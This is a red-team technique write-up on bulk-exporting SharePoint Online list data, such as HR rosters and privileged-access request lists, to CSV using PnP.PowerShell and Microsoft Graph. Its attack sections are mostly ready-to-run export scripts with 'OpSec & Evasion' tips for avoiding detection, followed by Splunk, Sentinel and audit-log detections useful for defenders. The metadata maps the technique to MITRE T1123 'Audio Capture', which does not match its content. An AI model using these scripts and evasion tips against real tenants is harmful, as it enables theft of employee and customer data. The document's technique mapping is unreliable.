# [COLLECT-LIST-001]: SharePoint List Data Collection

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-LIST-001 |
| **Technique Name** | SharePoint List Data Collection |
| **MITRE ATT&CK v18.1** | [T1123 – Audio Capture](https://attack.mitre.org/techniques/T1123/) |
| **Tactic** | Collection (TA0009) |
| **Platforms** | Microsoft 365, SharePoint Online |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | SharePoint Online (modern lists), Microsoft 365 E3/E5 tenants |
| **Patched In** | Not applicable – relies on legitimate SharePoint list APIs and permissions |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY
- **Concept:** This technique covers adversarial **enumeration and export of SharePoint list data** – not document libraries, but structured lists that often back business processes (access requests, HR rosters, customer records, incident logs, CMDB, etc.). Attackers use PnP.PowerShell, CSOM, or Microsoft Graph to **dump entire lists to CSV/JSON**, including custom columns and lookup fields, for offline analysis and correlation.
- **Attack Surface:** All SharePoint Online lists, including hidden or system lists backing applications (Power Apps, Power Automate, Teams apps). API surfaces include PnP.PowerShell, Microsoft Graph (`/sites/{site-id}/lists/{list-id}/items`), CSOM and REST endpoints.
- **Business Impact:** **High or Critical**, depending on list content. Lists often contain normalized, analysis‑ready business data such as employee directories, privileged account lists, customer PII, and configuration data. Leakage can directly violate regulatory obligations and provide precise input for subsequent lateral movement and fraud.
- **Technical Context:** List exports are common for reporting and migration. Attackers abuse the same interfaces, typically from admin workstations, CI/CD agents, or Azure Automation. Because list items are small, even **very large lists can be exfiltrated quickly**, often in a single CSV export, leaving audit trails that resemble normal admin tasks unless thresholds and context‑aware detections are in place.

### Operational Risk
- **Execution Risk:** Low – API usage and list exports are fully supported operations.
- **Stealth:** Medium to High – Activity looks like reporting, BI, or migration unless volume, timing, or identity are anomalous.
- **Reversibility:** Low – Once list data is copied off‑tenant, it cannot be revoked; items can be deleted, but knowledge of their contents persists.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Microsoft 365** | CIS O365 3.4, 3.9 | Restrict and monitor administrative access to SharePoint sites and lists. |
| **DISA STIG** | O365-SP-000030 | Ensure sensitive business data in SharePoint is appropriately protected and audited. |
| **CISA SCuBA** | M365-SPO-DATA-1 | Data discovery and access monitoring for SharePoint workloads. |
| **NIST 800-53** | AC-6, AU-6, MP-5 | Least privilege, audit review, and protection of organizational records. |
| **GDPR** | Art. 5, Art. 32 | Security and minimization of personal data held in registers and lists. |
| **DORA** | Art. 9 | Safeguards for ICT data supporting critical and important functions. |
| **NIS2** | Art. 21 | Technical/organizational measures for essential entities, including SaaS data stores. |
| **ISO 27001** | A.8.12, A.8.16 | Protection and classification of information stored in application databases and lists. |
| **ISO 27005** | Business Register Exposure Scenario | Risk of exposing structured registers used for operations and security. |

---

## 3. TECHNICAL PREREQUISITES
- **Required Privileges:**
  - Read access to target lists (member, visitor, or higher).
  - For tenant‑wide enumeration: SharePoint Administrator or application with Sites.Read.All / Sites.Selected.
- **Required Access:**
  - HTTPS to `*.sharepoint.com`, `graph.microsoft.com` and authentication endpoints.

**Supported Versions:**
- **SharePoint:** SharePoint Online (modern lists, including classic lists accessible via REST/CSOM).
- **PowerShell:** PnP.PowerShell on Windows/PowerShell 7, CSOM modules for legacy scripts.

- **Tools:**
  - PnP.PowerShell for quick exports.
  - Microsoft Graph SDK / REST for low‑level listItem operations.

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### List Discovery with PnP.PowerShell

```powershell
$SiteUrl = "https://<tenant>.sharepoint.com/sites/<site>"
Connect-PnPOnline -Url $SiteUrl -Interactive

Get-PnPList | Select Title, BaseTemplate, ItemCount, Hidden | Sort-Object ItemCount -Descending
```

**What to Look For:**
- Large lists (`ItemCount` in thousands or more).
- Lists with business‑critical names (e.g., `Access Requests`, `Customer Registry`, `Privileged Accounts`).
- Hidden or system lists used by apps that may hold sensitive data.

### Recon via Microsoft Graph

```powershell
Connect-MgGraph -Scopes "Sites.Read.All"
$site = Get-MgSite -Search "HR" | Select-Object -First 1
Get-MgSiteList -SiteId $site.Id | Select-Object Id, DisplayName, List
```

**What to Look For:**
- Lists with `Template` types such as `GenericList`, `Contacts`, `IssueTracking`, `CustomGrid` associated with line‑of‑business apps.

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1 – Export SharePoint Lists with PnP.PowerShell

**Supported Versions:** SharePoint Online (modern lists).

#### Step 1: Export Selected Fields to CSV
**Objective:** Dump key fields from a high‑value list to CSV for offline analysis.

```powershell
$SiteUrl = "https://<tenant>.sharepoint.com/sites/HR"
$ListName = "Employees"
$CsvPath = "C:\Temp\HR_Employees.csv"

Connect-PnPOnline -Url $SiteUrl -Interactive

$SelectedFields = @("Title","EmployeeID","Department","Manager","Email")
$Items = Get-PnPListItem -List $ListName -Fields $SelectedFields -PageSize 500

$Out = foreach ($i in $Items) {
    $fv = Get-PnPProperty -ClientObject $i -Property FieldValuesAsText
    $obj = [PSCustomObject]@{}
    foreach ($f in $SelectedFields) { $obj | Add-Member -NotePropertyName $f -NotePropertyValue $fv[$f] }
    $obj
}

$Out | Export-Csv $CsvPath -NoTypeInformation -Encoding UTF8
```

**Expected Output:**
- A CSV file containing one record per list item with normalized business attributes.

**OpSec & Evasion:**
- Limit field set to minimal required attributes to reduce suspicion around data volume.
- Run from a management host that legitimately performs exports.

---

### METHOD 2 – Full‑Field Export Using PnP.PowerShell

**Objective:** Export **all fields** (visible or not) from a list, including custom columns and app‑related fields.

```powershell
$SiteUrl = "https://<tenant>.sharepoint.com/sites/AccessMgmt"
$ListName = "PrivilegedAccessRequests"
$CsvPath = "C:\Temp\PrivAccess_AllFields.csv"

Connect-PnPOnline -Url $SiteUrl -Interactive

$Items = Get-PnPListItem -List $ListName -PageSize 2000
$Coll  = @()

foreach ($item in $Items) {
  $fv = Get-PnPProperty -ClientObject $item -Property FieldValuesAsText
  $row = New-Object PSObject
  (Get-PnPField -List $ListName) | ForEach-Object {
    $row | Add-Member -MemberType NoteProperty -Name $_.InternalName -Value $fv[$_.InternalName]
  }
  $Coll += $row
}

$Coll | Export-Csv $CsvPath -NoTypeInformation -Encoding UTF8
```

**Expected Output:**
- A wide CSV capturing **every field** present in the list, ideal for data‑science style analysis and pivoting.

---

### METHOD 3 – Enumerate List Items via Microsoft Graph

**Objective:** Use Graph to collect list data, often from app or service principal context.

```http
GET https://graph.microsoft.com/v1.0/sites/{site-id}/lists/{list-id}/items?expand=fields
```

**PowerShell Example:**
```powershell
Connect-MgGraph -Scopes "Sites.Read.All"
$items = Invoke-MgGraphRequest -Method GET -Uri "/sites/$($site.Id)/lists/$($list.Id)/items?`$expand=fields"

$items.value | ForEach-Object {
  [PSCustomObject]@{
    Id        = $_.id
    Title     = $_.fields.Title
    Field1    = $_.fields.CustomField1
    Field2    = $_.fields.CustomField2
    Created   = $_.fields.Created
    Modified  = $_.fields.Modified
  }
} | Export-Csv "C:\Temp\ListFromGraph.csv" -NoTypeInformation
```

**OpSec & Evasion:**
- Use application permissions with **Sites.Selected** and minimal app display names that match legitimate integrations.

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

- No Atomic Red Team test currently simulates SharePoint list exports directly.
- Validate detections by performing **controlled exports** in a test tenant and verifying:
  - Audit log entries for list read operations.
  - Endpoint logs for PnP/Graph command usage.
  - Sentinel/Splunk alerts for high‑volume list access.

---

## 7. TOOLS & COMMANDS REFERENCE

See COLLECT-METADATA-001 for detailed PnP and Graph references. The same cmdlets apply with different targets (`BaseTemplate` = GenericList instead of DocumentLibrary).

---

## 8. SPLUNK DETECTION RULES

### Rule: High‑Volume SharePoint List Reads

**Conceptual SPL:**
```spl
index=o365 sourcetype="o365:sharepoint"
| search Operation="ListItemRead" OR Operation="ListAccessed"
| stats count AS Reads BY UserId, SiteUrl, ListTitle
| where Reads > 500
```

- Tune thresholds based on normal reporting usage.

---

## 9. MICROSOFT SENTINEL DETECTION

### Query: Unusual SharePoint List Access Volume

```kusto
OfficeActivity
| where TimeGenerated > ago(1h)
| where Workload == "SharePoint"
| where Operation in ("ListItemViewed","ListItemAccessed")
| summarize Reads = count() by UserId, SiteUrl, ListId
| where Reads > 500
```

---

## 10. WINDOWS EVENT LOG MONITORING

Monitor PowerShell usage on admin workstations for `Get-PnPListItem`, `Get-PnPField`, `graph.microsoft.com` in **Event ID 4688** and PowerShell logs.

---

## 11. SYSMON DETECTION PATTERNS

- Detect PowerShell processes with `CommandLine` containing `Get-PnPListItem` or `GetListItem` CSOM calls.

---

## 12. MICROSOFT DEFENDER FOR CLOUD

- Use Defender for Cloud Apps / Microsoft 365 Defender anomaly policies for **unusual SharePoint activities** and bulk operations.

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

```powershell
Connect-ExchangeOnline
$Start = (Get-Date).AddDays(-7)
$End   = Get-Date

Search-UnifiedAuditLog -StartDate $Start -EndDate $End -ResultSize 5000 |
  Where-Object { $_.Workload -eq "SharePoint" -and $_.Operation -like "ListItem*" } |
  Export-Csv "C:\Temp\SPO_ListOps.csv" -NoTypeInformation
```

---

## 14. DEFENSIVE MITIGATIONS

- Apply **least privilege** on lists; avoid storing highly sensitive data in loosely governed team sites.
- Segregate **security/privileged registers** into tightly controlled sites with restricted admin access.

---

## 15. DETECTION & INCIDENT RESPONSE

- Correlate large list exports with user intent and change tickets.
- If suspicious, freeze access, export relevant audit logs, and rotate any secrets stored in lists (which should be avoided by design).

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| 1 | Initial Access | IA-VALID-001 – Default credential exploitation | Attacker gains tenant access. |
| 2 | Privilege Escalation | PE-ACCTMGMT-003 – SharePoint Site Collection Admin | Gains list admin rights. |
| 3 | Current Step | **COLLECT-LIST-001 – SharePoint List Data Collection** | Exports structured business registers. |
| 4 | Collection/Exfiltration | CA-UNSC-014 – SaaS API key exposure | Uses list contents (tokens, URLs) for further compromise. |
| 5 | Impact | REALWORLD-003 – POP/IMAP Basic Auth Abuse | Uses harvested identities for email account takeover and fraud. |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Access Request List Dump
- Attacker exported an **Access Requests** list containing privileged account requests and approvals.
- Used identities and justification texts to plan lateral movement.

### Example 2: HR Employee Directory List
- Insider exfiltrated the corporate employee directory list (names, roles, contact details) via PnP.PowerShell for sale to external actors.

---